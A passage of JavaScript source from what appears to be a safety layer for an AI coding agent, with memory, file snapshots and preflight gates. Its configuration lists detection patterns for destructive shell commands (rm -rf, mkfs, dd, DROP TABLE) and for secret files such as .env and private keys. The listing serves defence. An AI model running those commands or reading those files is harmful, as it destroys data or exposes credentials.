            var httpCall = (typeof Network.httpGet === "function")
                ? Network.httpGet.bind(Network)
                : Network.get.bind(Network);

            var url = buildUrl(keyword, language, minStars, limit);
            var kw = keyword;

            return limiter.run(function () {
                return attemptSearch(kw, url, 1, limit, httpCall);
            });
        }

        async function attemptSearch(kw, url, attempt, limit, httpCall) {
            try {
                var resp = await httpCall(url);
                var body = resp && resp.content ? resp.content : resp;
                var json;
                if (typeof body === "string") {
                    json = JSON.parse(body);
                } else {
                    json = body;
                }
                var items = (json && json.items) || [];
                var repos = items.slice(0, limit).map(function (r) {
                    return {
                        name: r.full_name,
                        stars: r.stargazers_count,
                        forks: r.forks_count,
                        language: r.language,
                        license: r.license ? r.license.spdx_id : "unknown",
                        updated_at: r.pushed_at,
                        open_issues: r.open_issues_count,
                        url: r.html_url,
                        description: r.description,
                    };
                });
                return {
                    success: true,
                    code: ErrorCode.OK,
                    query: kw,
                    total_count: json.total_count || repos.length,
                    count: repos.length,
                    repos: repos,
                    note:
                        repos.length >= 3
                            ? "已返回 >=3 个候选，可进入比较-选择-融合流程"
                            : "候选不足3个，建议放宽关键词或降低 min_stars",
                };
            } catch (err) {
                if (retry.shouldRetry(attempt, err)) {
                    var delay = retry.delayFor(attempt);
                    await sleep(delay);
                    return attemptSearch(kw, url, attempt + 1, limit, httpCall);
                }
                return {
                    success: false,
                    code: ErrorCode.NETWORK_ERROR,
                    query: kw,
                    error: safeString(err),
                    fallback:
                        "GitHub API 请求失败（可能限流/无网络）。可改用 visit_web 搜索，或标注 GUESSED 后自行实现。",
                };
            }
        }

        return { search: search };
    }

    // ======================================================================
    // §18 Memory — Operit persistent memory with LRU cache + sharding
    // Tools.Memory dependency injected.
    // ======================================================================
    function MemoryModule(deps) {
        deps = deps || {};
        var Tools = deps.Tools;
        var cache = new LRUCache(ConfigRegistry.get("memory.cache_size", 64));

        function root() { return ConfigRegistry.get("memory.root", "zero_apex"); }

        function shardFolder(kind, project) {
            var base = root();
            var isFailure = safeString(kind) === "failure";
            var sub = isFailure ? "failure" : "success";
            // Shard by project name hash (simple) to distribute entries.
            var p = safeString(project);
            var shard = p ? p.replace(/[^a-zA-Z0-9_-]/g, "_").slice(0, 24) : "misc";
            return PathUtils.join(base, sub, shard);
        }

        async function remember(kind, project, summary, evidence, techStack) {
            if (!Tools || !Tools.Memory) {
                return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Tools.Memory 不可用" };
            }
            var isFailure = safeString(kind) === "failure";
            var folder = shardFolder(kind, project);
            var stamp = nowStamp();
            var title =
                "[" + (isFailure ? "失败" : "成功") + "] " + project + " · " + stamp;
            var content =
                "项目: " + project + "\n" +
                "类型: " + (isFailure ? "失败经验" : "成功方案") + "\n" +
                "摘要: " + safeString(summary) + "\n" +
                "证据: " + safeString(evidence || "无") + "\n" +
                "技术栈: " + safeString(techStack || "未标注") + "\n" +
                "记录时间: " + new Date().toISOString();
            var tags =
                (isFailure ? "failure" : "success") +
                "," + project +
                (techStack ? "," + techStack.split(/[,，]/).join(",") : "");
            try {
                var raw = await Tools.Memory.create({
                    title: title,
                    content: content,
                    source: "zero_apex_engine",
                    folderPath: folder,
                    tags: tags,
                });
                // Tools.Memory.create may return a string ID or {id, success}
                var memId = (typeof raw === "string") ? raw : (raw && raw.id ? raw.id : null);
                // Invalidate cache on write
                cache.clear();
                return {
                    success: !!memId,
                    code: memId ? ErrorCode.OK : ErrorCode.WRITE_FAILED,
                    message: "经验已写入真实记忆库",
                    memory_id: memId,
                    title: title,
                    folder: folder,
                };
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        async function recall(query, kind, limit) {
            if (!Tools || !Tools.Memory) {
                return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Tools.Memory 不可用" };
            }
            limit = limit != null ? limit : 5;
            var cacheKey = safeString(query) + "|" + safeString(kind) + "|" + limit;
            var cached = cache.get(cacheKey);
            if (cached) {
                return Object.assign({}, cached, { from_cache: true });
            }
            var folder = root();
            if (kind === "success") folder = PathUtils.join(root(), "success");
            else if (kind === "failure") folder = PathUtils.join(root(), "failure");
            try {
                var res = await Tools.Memory.query({
                    query: query,
                    folderPath: folder,
                    limit: limit,
                });
                var entries = [];
                if (res && res.memories) entries = res.memories;
                else if (Array.isArray(res)) entries = res;
                else if (res && res.results) entries = res.results;

                // F7: client-side relevance re-ranking on top of vector recall.
                // Score = keyword overlap + recency bonus + failure/success match.
                // This catches cases where the vector model returns semantically
                // similar but topically irrelevant entries.
                if (entries.length > 1) {
                    var qWords = safeString(query).toLowerCase().split(/\s+/).filter(function(w){ return w.length > 1; });
                    entries = entries.map(function(e) {
                        var text = safeString((e.title || "") + " " + (e.content || "")).toLowerCase();
                        var score = 0;
                        // keyword overlap
                        for (var qi = 0; qi < qWords.length; qi++) {
                            if (text.indexOf(qWords[qi]) >= 0) score += 2;
                        }
                        // kind match bonus
                        if (kind && e.tags && safeString(e.tags).indexOf(kind) >= 0) score += 3;
                        // recency bonus (ISO date string, lexicographic sort works for same-format dates)
                        var ts = e.created_at || e.timestamp || "";
                        if (ts) score += 1; // any timestamped entry gets a small boost
                        e._relevance_score = score;
                        return e;
                    });
                    entries.sort(function(a, b) { return (b._relevance_score || 0) - (a._relevance_score || 0); });
                }
                var out = {
                    success: true,
                    code: ErrorCode.OK,
                    query: query,
                    kind: kind || "all",
                    count: entries.length,
                    memories: entries,
                };
                cache.set(cacheKey, out);
                return out;
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        return { remember: remember, recall: recall };
    }

    // ======================================================================
    // §19 Snapshot — .trash backup/restore with file lock
    // Files dependency injected; FileLock prevents concurrent writes.
    // ======================================================================
    function SnapshotModule(deps) {
        deps = deps || {};
        var Files = deps.Files;
        var lock = new FileLock();
        // Monotonic counter ensures same-second snapshots get distinct names.
        // Format: "file.js.YYYYMMDD_HHMMSS_NNN" (NNN = 001, 002, ...)
        var snapSeq = 0;

        async function snapshot(path) {
            if (!Files) {
                return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Files 不可用" };
            }
            if (PathUtils.hasTraversal(path)) {
                return { success: false, code: ErrorCode.PATH_TRAVERSAL, error: "路径含非法遍历片段" };
            }
            return lock.withLock(path, function () { return doSnapshot(path); });
        }

        async function doSnapshot(path) {
            try {
                var content;
                try {
                    content = await Files.read(path);
                } catch (readErr) {
                    return { success: false, code: ErrorCode.FILE_NOT_FOUND, error: "源文件不存在: " + path };
                }
                var td = PathUtils.trashDir(path);
                try { await Files.write(PathUtils.join(td, ".keep"), ""); } catch (e) {}
                // Append per-snapshot counter to guarantee uniqueness even when
                // two snapshots are taken in the same second (e.g. bulk scripts).
                // The timestamp portion keeps the YYYYMMDD_HHMMSS shape so
                // extractTimestamp() can still parse it for cleanup ordering.
                var seq = (++snapSeq).toString().padStart(3, "0");
                var snapName = PathUtils.basename(path) + "." + nowStamp() + "_" + seq;
                var dest = PathUtils.join(td, snapName);
                // Files.read may return string or {content, exists, error}
                var contentStr = (typeof content === "string")
                    ? content
                    : ((content && content.content) || "");
                var w = await Files.write(dest, contentStr);
                return {
                    success: !!(w && (w.successful === undefined || w.successful)),
                    code: ErrorCode.OK,
                    message: "已备份到快照目录",
                    original: path,
                    snapshot: dest,
                    snapshot_name: snapName,
                };
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        async function restore(path, snapshotName) {
            if (!Files) {
                return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Files 不可用" };
            }
            if (PathUtils.hasTraversal(path)) {
                return { success: false, code: ErrorCode.PATH_TRAVERSAL, error: "路径含非法遍历片段" };
            }
            return lock.withLock(path, function () { return doRestore(path, snapshotName); });
        }

        async function doRestore(path, snapshotName) {
            try {
                var td = PathUtils.trashDir(path);
                var src;
                if (snapshotName) {
                    src = PathUtils.join(td, snapshotName);
                } else {
                    var entries = [];
                    try {
                        var listing = Files.listFiles ? await Files.listFiles(td) : null;
                        if (listing && listing.entries) entries = listing.entries;
                    } catch (e) {}
                    var prefix = PathUtils.basename(path) + ".";
                    var cands = [];
                    for (var i = 0; i < entries.length; i++) {
                        var n = typeof entries[i] === "string" ? entries[i] : entries[i].name;
                        if (n && n.indexOf(prefix) === 0) cands.push(n);
                    }
                    cands.sort();
                    if (cands.length === 0) {
                        return {
                            success: false,
                            code: ErrorCode.FILE_NOT_FOUND,
                            error: "未找到 " + path + " 的快照，请显式指定 snapshot_name",
                        };
                    }
                    src = PathUtils.join(td, cands[cands.length - 1]);
                }
                var content = await Files.read(src);
                var contentStr = (typeof content === "string")
                    ? content
                    : ((content && content.content) || "");
                var w = await Files.write(path, contentStr);
                return {
                    success: !!(w && (w.successful === undefined || w.successful)),
                    code: ErrorCode.OK,
                    message: "已从快照恢复",
                    restored_from: src,
                    target: path,
                };
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        async function cleanup(options) {
            if (!Files) return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Files 不可用" };
            options = options || {};
            var defaults = ConfigRegistry.get("snapshot.cleanup", {});
            var maxAgeHours = options.max_age_hours || defaults.max_age_hours || 168;
            var maxCount = options.max_count || defaults.max_count || 50;
            var basePath = options.base_path;
            try {
                var td = basePath ? PathUtils.trashDir(basePath) : null;
                if (!td) return { success: true, code: ErrorCode.OK, cleaned: 0, message: "未指定 base_path，跳过清理" };
                var listing;
                try { listing = Files.listFiles ? await Files.listFiles(td) : null; } catch (e) {}
                if (!listing || !listing.entries) return { success: true, code: ErrorCode.OK, cleaned: 0, message: "无法列出快照目录" };
                var entries = listing.entries;
                var now = Date.now();
                var cutoff = now - maxAgeHours * 3600 * 1000;
                var cleaned = 0;
                var skip = {};
                var cands = [];
                for (var i = 0; i < entries.length; i++) {
                    var n = typeof entries[i] === "string" ? entries[i] : (entries[i].name || "");
                    if (n === ".keep" || n === ".deleted") continue;
                    var ts = extractTimestamp(n);
                    if (ts > 0 && ts < cutoff) {
                        try {
                            var p = PathUtils.join(td, n);
                            await Files.write(PathUtils.join(td, n + ".deleted"), "");
                            await Files.write(p, "");
                            skip[n] = true;
                            cleaned++;
                        } catch (e2) {}
                    }
                }
                var remaining = [];
                for (var j = 0; j < entries.length; j++) {
                    var rn = typeof entries[j] === "string" ? entries[j] : (entries[j].name || "");
                    if (skip[rn]) continue;
                    if (rn === ".keep" || rn === ".deleted") continue;
                    remaining.push(entries[j]);
                }
                if (remaining.length > maxCount) {
                    remaining.sort(function (a, b) {
                        var na = typeof a === "string" ? a : (a.name || "");
                        var nb = typeof b === "string" ? b : (b.name || "");
                        var ta = extractTimestamp(na);
                        var tb = extractTimestamp(nb);
                        return ta < tb ? -1 : ta > tb ? 1 : 0;
                    });
                    var excess = remaining.length - maxCount;
                    for (var k = 0; k < excess; k++) {
                        var en = typeof remaining[k] === "string" ? remaining[k] : (remaining[k].name || "");
                        try {
                            var ep = PathUtils.join(td, en);
                            await Files.write(PathUtils.join(td, en + ".deleted"), "");
                            await Files.write(ep, "");
                            cleaned++;
                        } catch (e3) {}
                    }
                }
                return { success: true, code: ErrorCode.OK, cleaned: cleaned, message: "标记清理了 " + cleaned + " 个过期/超限快照" };
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        function extractTimestamp(name) {
            if (!name) return 0;
            // Snapshot name format: "file.YYYYMMDD_HHMMSS_NNN" (counter suffix
            // added in v2.5.5 for same-second uniqueness). The timestamp portion
            // is still YYYYMMDD[_HHMMSS]?; we ignore the trailing counter.
            var m = String(name).match(/(\d{8})(?:[_]?(\d{6}))?(?:_\d+)?$/);
            if (!m) {
                // Last-ditch: pure-digit tail
                var dot = name.lastIndexOf(".");
                if (dot < 0) return 0;
                var tail = name.substring(dot + 1);
                if (!/^\d+$/.test(tail)) return 0;
                var ts = parseInt(tail, 10);
                return isNaN(ts) ? 0 : ts;
            }
            var d = m[1] || "";
            var t = m[2] || "";
            if (t.length === 6) {
                return parseInt(d + t, 10);
            }
            return parseInt(d + "000000", 10);
        }

        // Tombstone: since Files.delete is unavailable in Operit sandbox,
        // we replace the original file with a tombstone marker pointing to
        // the most recent snapshot. The file is still there but logically
        // "deleted" — restore_file can recover it from the snapshot.
        async function tombstone(path) {
            if (!Files) return { success: false, code: ErrorCode.DEPENDENCY_MISSING, error: "Files 不可用" };
            if (PathUtils.hasTraversal(path)) {
                return { success: false, code: ErrorCode.PATH_TRAVERSAL, error: "路径含非法遍历片段" };
            }
            try {
                // First snapshot the file
                var snap = await snapshot(path);
                if (!snap.success) return snap;
                // Then overwrite with tombstone marker
                var marker = [
                    "### ZERO_APEX_TOMBSTONE ###",
                    "原文件已被逻辑删除: " + path,
                    "快照位置: " + snap.snapshot,
                    "时间: " + new Date().toISOString(),
                    "### 调用 restore_file 恢复 ###",
                ].join("\n");
                var w = await Files.write(path, marker);
                return {
                    success: !!(w && (w.successful === undefined || w.successful)),
                    code: ErrorCode.OK,
                    message: "已写入墓碑（Files.delete 不可用，原始位置被覆盖为恢复指针）",
                    tombstoned: path,
                    snapshot: snap.snapshot,
                    recoverable: true,
                };
            } catch (e) {
                return { success: false, code: ErrorCode.INTERNAL_ERROR, error: safeString(e) };
            }
        }

        return { snapshot: snapshot, restore: restore, cleanup: cleanup, tombstone: tombstone, _extractTimestamp: extractTimestamp };
    }

    // ======================================================================
    // §19b GateRegistry — extensible preflight gate chain
    // ======================================================================
    var GateRegistry = [];
    function registerGate(name, fn) {
        for (var i = 0; i < GateRegistry.length; i++) {
            if (GateRegistry[i].name === name) { GateRegistry[i].fn = fn; return; }
        }
        GateRegistry.push({ name: name, fn: fn });
    }
    async function runGates(ctx, bypassSet) {
        // bypassSet is an optional {gateName: 1} map of gates to skip entirely
        // for this call. When a gate is bypassed, it's reported as such in
        // the result so callers can see what was disabled.
        bypassSet = bypassSet || (ctx && ctx.bypass) || {};
        var results = [];
        for (var i = 0; i < GateRegistry.length; i++) {
            var g = GateRegistry[i];
            if (bypassSet[g.name]) {
                results.push({ gate: g.name, bypassed: true });
                continue;
            }
            try {
                var r = g.fn(ctx);
                if (r && typeof r.then === "function") r = await r;
                if (r) results.push({ gate: g.name, result: r });
            } catch (e) {
                results.push({ gate: g.name, error: safeString(e) });
            }
        }
        return results;
    }

    // Register default gates
    registerGate("self_awareness", function (ctx) {
        var self = SelfMonitor.assess({
            goal: ctx.goal,
            files_read: ctx.filesRead,
            evidence_ready: !!(ctx.evidence && safeString(ctx.evidence).trim()),
        });
        ctx.self = self;
        if (self.cognitive_biases.length > 0) {
            return { triggered: true, biases: self.cognitive_biases };
        }
        return { triggered: false };
    });
    registerGate("file_guard", function (ctx) {
        if (!ctx.command) return null;
        var risk = FileGuard.analyzeCommand(ctx.command);
        if (risk.requires_confirmation) {
            return { triggered: true, risk: risk, block: true };
        }
        return { triggered: false };
    });
    registerGate("permission", function (ctx) {
        if (!ctx.command || !ctx.deps || !ctx.deps.permissions) return null;
        var perm = ctx.deps.permissions.evaluate("bash", { command: ctx.command });
        if (perm.verdict === "DENY") {
            return { triggered: true, reason: perm.reason, block: true };
        }
        return { triggered: false };
    });
    registerGate("hallucination", async function (ctx) {
        // F6: augment evidence with ReasoningChain observations if available
        var augEvidence = ctx.evidence || "";
        if (ctx.chain_summary && ctx.chain_summary.length > 0) {
            augEvidence = augEvidence ? (augEvidence + "\n[推理链]\n" + ctx.chain_summary) : ctx.chain_summary;
        }
        var hallu = await Hallucination.check(ctx.goal, augEvidence);
        ctx.hallu = hallu;
        // F1: if Reflexion hints exist and hallu already triggered, escalate severity
        if (!hallu.allowed && ctx.reflexion_hint && ctx.reflexion_hint.length > 0) {
            hallu.reflexion_warning = ctx.reflexion_hint;
        }
        if (!hallu.allowed) {
            var shouldBlock = false;
            for (var i = 0; i < hallu.violations.length; i++) {
                var vrule = hallu.violations[i].rule;
                if (vrule === "fact_without_evidence" ||
                    vrule === "evidence_contradicts_claim" ||
                    vrule === "missing_confidence_label" ||
                    vrule === "fabricated_citation" ||
                    vrule === "absolute_without_verified" ||
                    vrule === "unsourced_tech_assertion") {
                    shouldBlock = true;
                    break;
                }
            }
            return { triggered: true, violations: hallu.violations, block: shouldBlock, reflexion_warning: hallu.reflexion_warning };
        }
        return { triggered: false };
    });
    registerGate("output_firewall", function (ctx) {
        // Preflight doesn't have model output yet. Run on evidence string if
        // present, otherwise skip. Avoids blocking on first-person goal text
        // like "让我想想怎么改这个 bug" which is normal Chinese goal phrasing.
        var scanText = ctx.evidence || ctx.goal || "";
        if (!ctx.evidence) {
            return { triggered: false, skipped: true, reason: "preflight has no model output yet" };
        }
        var of = OutputFirewall.check(scanText);
        ctx.of = of;
        if (of.severity === "SEVERE" || of.severity === "MAJOR") {
            return { triggered: true, violations: of.violations, severity: of.severity, block: of.severity === "SEVERE" };
        }
        return { triggered: false };
    });
    registerGate("snapshot", function (ctx) {
        // Use !! instead of === true so that arrays of files-read (truthy)
        // also trigger the snapshot advice, not just the literal boolean.
        if (ctx.command && FileGuard.analyzeCommand(ctx.command).is_delete && !!ctx.filesRead) {
            return { triggered: true, advice: "执行破坏性命令前建议先调用 snapshot_file 备份目标文件" };
        }
        return { triggered: false };
    });

    // ======================================================================
    // §20 PreflightGate — orchestrator with TaskLedger
    // Uses GateRegistry for extensibility.
    // ======================================================================
    async function preflightGate(deps, goal, command, evidence, filesRead, options) {
        options = options || {};
        var ledger = deps && deps.ledger ? deps.ledger : new TaskLedger(deps);
        // Use very-high priority so this fresh task is what `next()` returns,
        // not a stale pending task with priority 0.
        var taskId = ledger.enqueue({ goal: goal, priority: Number.MAX_SAFE_INTEGER });
        var task = ledger.next();
        if (!task || task.id !== taskId) {
            // Defensive: if another task has the same MAX priority (unlikely),
            // look up the one we just enqueued by id and mark it running.
            var snap = ledger.snapshot();
            for (var i = 0; i < snap.length; i++) {
                if (snap[i].id === taskId && snap[i].status === "pending") {
                    snap[i].status = "running";
                    snap[i].started_at = new Date().toISOString();
                    task = snap[i];
                    break;
                }
            }
            if (!task) task = { id: taskId, goal: goal };
        }

        // Build set of bypassed gate names for this call.
        // Common use: user is running a sandbox experiment and wants to
        // skip file_guard to test destructive operations. They opt-in via
        // preflight({ ..., bypass: ["file_guard"] }).
        var bypassSet = {};
        if (Array.isArray(options.bypass)) {
            for (var bi = 0; bi < options.bypass.length; bi++) {
                if (typeof options.bypass[bi] === "string") {
                    bypassSet[options.bypass[bi]] = 1;
                }
            }
        }
        var bypassLog = Object.keys(bypassSet);

        var gates = [];
        var reasons = [];
        var allowed = true;
        var requiresConfirmation = false;

        var ctx = {
            deps: deps,
            goal: goal,
            command: command,
            evidence: evidence,
            filesRead: filesRead,
            self: null,
            hallu: null,
            of: null,
            bypass: bypassSet,
            // F1: inject Reflexion history hint so gates can use past failure patterns
            reflexion_hint: Reflexion.contextHint(goal, null),
            // F2: chain summary injected by caller via options.chain_summary
            chain_summary: options.chain_summary || "",
        };

        var gateResults = await runGates(ctx, bypassSet);

        for (var i = 0; i < gateResults.length; i++) {
            var gr = gateResults[i];
            if (gr.error) {
                reasons.push("门控[" + gr.gate + "] 执行错误: " + gr.error);
                continue;
            }
            var r = gr.result;
            if (!r) continue;
            // gates_triggered: only count gates that actually fired (triggered=true).
            // Gates that ran but did not fire are reported in gates_evaluated.
            if (r.triggered) gates.push(gr.gate);
            if (gr.gate === "self_awareness" && r.triggered) {
                for (var b = 0; b < r.biases.length; b++) {
                    reasons.push("偏差[" + r.biases[b].bias + "]: " + r.biases[b].warn);
                }
            }
            if (gr.gate === "file_guard" && r.triggered) {
                for (var fr = 0; fr < r.risk.reasons.length; fr++) reasons.push(r.risk.reasons[fr]);
                if (r.block) { allowed = false; requiresConfirmation = true; }
            }
            if (gr.gate === "permission" && r.triggered) {
                reasons.push("权限拒绝: " + r.reason);
                if (r.block) allowed = false;
            }
            if (gr.gate === "hallucination" && r.triggered) {
                for (var hv = 0; hv < r.violations.length; hv++) {
                    reasons.push("幻觉[" + r.violations[hv].rule + "]: " + r.violations[hv].fix);
                }
                if (r.block) allowed = false;
            }
            if (gr.gate === "output_firewall" && r.triggered) {
                for (var ov = 0; ov < r.violations.length; ov++) {
                    reasons.push("防火墙[" + r.violations[ov].type + "]: " + r.violations[ov].hit);
                }
                if (r.block) allowed = false;
            }
            if (gr.gate === "snapshot" && r.triggered) {
                reasons.push("提示: " + r.advice);
            }
        }

        var self = ctx.self || { cognitive_biases: [], state: "READY", dimensions: { confidence: "INFERRED" }, readiness_score: 0, status_card: "" };
        var hallu = ctx.hallu || { allowed: true, violations: [] };
        var of = ctx.of || { severity: "CLEAN", violations: [] };

        var state;
        if (requiresConfirmation) state = "WAIT_CONFIRMATION";
        else if (!allowed) state = "NEED_EVIDENCE";
        else if (self.state === "NOT_READY") state = "NOT_READY";
        else state = "READY";

        var seen = {};
        var uniqReasons = [];
        for (var u = 0; u < reasons.length; u++) {
            if (!seen[reasons[u]]) { seen[reasons[u]] = true; uniqReasons.push(reasons[u]); }
        }

        // Build gates_evaluated (all gates that ran, regardless of whether they fired)
        var gatesEvaluated = [];
        for (var ge = 0; ge < gateResults.length; ge++) {
            var ger = gateResults[ge];
            if (ger && ger.gate) gatesEvaluated.push(ger.gate);
        }

        var result = {
            allowed: allowed && self.state === "READY",
            state: state,
            requires_confirmation: requiresConfirmation,
            confidence: self.dimensions.confidence,
            readiness_score: self.readiness_score,
            gates_triggered: gates,
            gates_evaluated: gatesEvaluated,
            reasons: uniqReasons,
            self_awareness: self,
            hallucination: hallu,
            output_firewall: of,
            snapshot_advice: gates.indexOf("snapshot") >= 0,
            status_card: self.status_card,
            task_id: taskId,
            // F10: surface Reflexion hint and chain context for caller
            reflexion_hint: ctx.reflexion_hint || "",
            chain_summary: ctx.chain_summary || "",
            // Principle-3 (minimal change scope): warn if command/goal looks broad
            scope_warning: (function () {
                var cmd = String(command || "");
                var g = String(goal || "");
                // Broad recursive patterns
                if (/\-r[f]?\s|--recursive|find\s.*\-exec|xargs/.test(cmd)) return "命令含递归操作，影响范围可能超出预期，建议缩小到具体路径";
                // Multi-module goal signals
                if ((g.match(/重构|重写|全部|所有|整个|批量/g) || []).length >= 2) return "目标描述含多个广泛修改信号，建议拆分为最小步骤逐一执行";
                // Large file count hints
                if (/\*\.\w+|\*\*\//.test(cmd)) return "命令含通配符，建议先 dry-run 确认影响文件范围";
                return "";
            })(),
        };

        // F1: if there are relevant past failures, add them to reasons so the
        // caller can display them without having to call reflexion separately
        if (ctx.reflexion_hint && ctx.reflexion_hint.length > 0 && !allowed) {
            result.reasons.push(ctx.reflexion_hint);
        }

        ledger.complete(taskId, { allowed: result.allowed, state: state });
        return result;
    }

    // ======================================================================
    // §21 Config bootstrap — register all patterns into ConfigRegistry
    // ======================================================================
    function bootstrapConfig() {
        // FileGuard patterns
        ConfigRegistry.register("file_guard.delete_patterns", [
            { re: /\brm\s+(-[rfRvi]+\s+)*/, name: "rm", desc: "删除文件/目录" },
            { re: /\brmdir\b/, name: "rmdir", desc: "删除目录" },
            { re: /\bunlink\b/, name: "unlink", desc: "删除链接/文件" },
            { re: /\bshred\b/, name: "shred", desc: "粉碎文件（不可恢复）" },
            { re: /\bmkfs\.[a-z0-9]+\b/, name: "mkfs", desc: "格式化文件系统" },
            { re: /\bdd\s+if=/, name: "dd", desc: "块级写入/擦除" },
            { re: /\btruncate\s+-s\s*0\b/, name: "truncate", desc: "清空文件内容" },
            { re: />\s*\/dev\/sd[a-z]/, name: "device-write", desc: "写入原始磁盘设备" },
            { re: /\bgit\s+clean\s+-[a-z]*f/, name: "git clean -f", desc: "删除未跟踪文件" },
            { re: /\bgit\s+reset\s+--hard/, name: "git reset --hard", desc: "丢弃工作区改动" },
            { re: /\brsync\b[^\n]*--delete/, name: "rsync --delete", desc: "同步时删除目标多余文件" },
            { re: /\bfind\b[^\n]*-delete/, name: "find -delete", desc: "查找并删除" },
            { re: /\bxargs\b[^\n]*\brm\b/, name: "xargs rm", desc: "管道批量删除" },
            { re: />\s*[^\s|&;]+/, name: "overwrite", desc: "重定向覆盖文件", soft: true },
        ]);
        ConfigRegistry.register("file_guard.indirect_patterns", [
            /os\.system\(\s*['"][^'"]*\brm\b/,
            /subprocess\.[a-zA-Z_]+\(\s*\[?\s*['"]rm['"]/,
            /shutil\.rmtree\s*\(/,
            /os\.remove\s*\(/,
            /os\.unlink\s*\(/,
            /Files\.deleteFile\s*\(/,
            /fs\.unlink(Sync)?\s*\(/,
            /fs\.rm(Sync)?\s*\(/,
            // fs-rmdir is a directory delete, not a record delete
            /fs\.rmdir(Sync)?\s*\(/,
            // /Files\.delete\(/   (Files.delete was renamed to deleteFile in Operit)
            /Files\.delete\s*\(/,
            // Prisma / Sequelize / TypeORM / Mongoose delete: only flag
            // "dangerous" methods, not normal data operations.
            // - .destroy() / .deleteMany() / .deleteOne() are safe (data layer)
            // - .dropDatabase() / .dropTable() / .dropSchema() are destructive
            /\.drop(Database|Table|Schema|Index|Column|Constraint)\s*\(/i,
            // SQL/DDL: DROP TABLE / DATABASE / SCHEMA
            /\bDROP\s+(TABLE|DATABASE|SCHEMA|INDEX|VIEW)\b/i,
            // SQLite file deletion (rm db.sqlite)
            /\brm\s+[^\n]*\.(db|sqlite|sqlite3)\b/,
            // Note: \.delete\(\) is intentionally NOT here. It matches
            // Map.delete/Set.delete/ORM .delete() which are legitimate
            // data operations, not file deletion.
        ]);
        ConfigRegistry.register("file_guard.risky_paths", [
            { re: /^\/(bin|boot|dev|etc|lib|proc|root|sbin|sys|usr|var)(\/|$)/, why: "系统目录" },
            { re: /(^|\/)sdcard(\/|$)/, why: "用户存储目录", writeOnly: true },
            { re: /\/storage\/emulated\//, why: "用户存储目录", writeOnly: true },
            { re: /(^|\/)\.env($|\.)/, why: "环境变量/密钥文件" },
            { re: /(^|\/)(id_rsa|id_ed25519|\.pem|\.key|\.keystore|\.jks)($|\/)/, why: "私钥/签名文件" },
            { re: /(^|\/)credentials?(\.json)?($|\/)/, why: "凭据文件" },
            { re: /(^|\/)\.git($|\/)/, why: "版本库元数据" },
        ]);

        // Hallucination config
        ConfigRegistry.register("hallucination.fact_claims", [
            "已读取", "已修改", "已编译", "已安装", "已测试", "已修复",
            "已部署", "已删除", "已创建", "已验证", "完成", "搞定", "跑通",
            "编译通过", "测试通过", "构建成功",
            // Past/present-tense success variants
            "编译成功", "测试成功", "构建完成", "部署完成", "修复完成", "安装完成", "创建完成", "删除完成",
            "已通过", "已成功", "已上线", "已发布", "已交付", "已合并",
            "success", "successfully", "passed", "fixed", "deployed", "installed", "compiled",
        ]);
        ConfigRegistry.register("hallucination.absolute_words", ["一定", "肯定", "必然", "绝对", "百分之百", "毫无疑问", "毋庸置疑"]);
        ConfigRegistry.register("hallucination.overconfident_words", ["显然", "很明显", "不用想", "众所周知"]);
        ConfigRegistry.register("hallucination.tech_patterns", [
            /已(经)?(被)?(废弃|弃用|移除|删除|下线)/,
            /在(新版本|最新版|.*版本).*(移除|删除|不支持|废弃)/,
            /不再(支持|维护|推荐)/,
        ]);
        ConfigRegistry.register("hallucination.valid_labels", ["VERIFIED", "INFERRED", "GUESSED", "UNKNOWN"]);

        // Evidence regexes
        ConfigRegistry.register("evidence.build_ok", /BUILD SUCCESSFUL|build success|compiled successfully|构建成功|编译通过/i);
        ConfigRegistry.register("evidence.build_fail", /BUILD FAILED|error:|FAILURE|Exception|编译失败|构建失败/i);
        ConfigRegistry.register("evidence.test_ok", /(\d+)\s+passed|tests? passed|OK \(\d+ tests?\)|全部通过|测试通过/i);
        ConfigRegistry.register("evidence.install_ok", /Success\b|installed|安装成功|Performing Streamed Install/i);

        // SelfMonitor bias patterns
        ConfigRegistry.register("self_monitor.bias_patterns", [
            { re: /(应该|大概|可能就是|估计)(没|不会|不用)/, bias: "乐观偏差", warn: "对失败可能性估计不足，建议验证" },
            { re: /(以前|上次|一般)(都|就)(是|这样)/, bias: "近因/锚定偏差", warn: "历史经验权重过高，需结合当前证据" },
            { re: /(肯定|一定)(没问题|可以|行)/, bias: "过度自信偏差", warn: "缺乏验证的确定性判断" },
        ]);

        // OutputFirewall config
        ConfigRegistry.register("output_firewall.thought_leak", [
            "我认为", "我推测", "我分析", "我想到", "我正在思考", "我准备",
            "我打算", "让我想想", "在我看来", "我个人觉得", "我的理解是",
        ]);
        ConfigRegistry.register("output_firewall.tool_leak", [
            /tool_name\s*[:=]/i, /tool_args/i,
            /api_key\s*[:=]/i,        // key=value context only, not key names like api_key_description
            /token\s*[:=]\s*['"\w]/i, // token= followed by value
            /secret\s*[:=]/i, /password\s*[:=]/i, /Authorization:\s*Bearer/i,
        ]);
        ConfigRegistry.register("output_firewall.filler", [
            "加油", "没问题的", "不用担心", "好的我这就来帮你", "我这就",
            "不好意思", "很抱歉", "你说得对", "完全理解", "没关系的",
        ]);
        ConfigRegistry.register("output_firewall.emotional", [
            "我理解你的感受", "这种情况确实令人", "我感同身受", "我能体会",
        ]);

        // OpenSource config
        ConfigRegistry.register("opensource.max_attempts", 3);
        ConfigRegistry.register("opensource.base_delay_ms", 500);
        ConfigRegistry.register("opensource.max_delay_ms", 4000);
        ConfigRegistry.register("opensource.max_concurrency", 2);
        ConfigRegistry.register("opensource.default_min_stars", 500);
        ConfigRegistry.register("opensource.default_limit", 5);

        // Memory config
        ConfigRegistry.register("memory.root", "zero_apex");
        ConfigRegistry.register("memory.cache_size", 64);

        // Snapshot cleanup config
        ConfigRegistry.register("snapshot.cleanup", { max_age_hours: 168, max_count: 50 });

        // Audit config (#8)
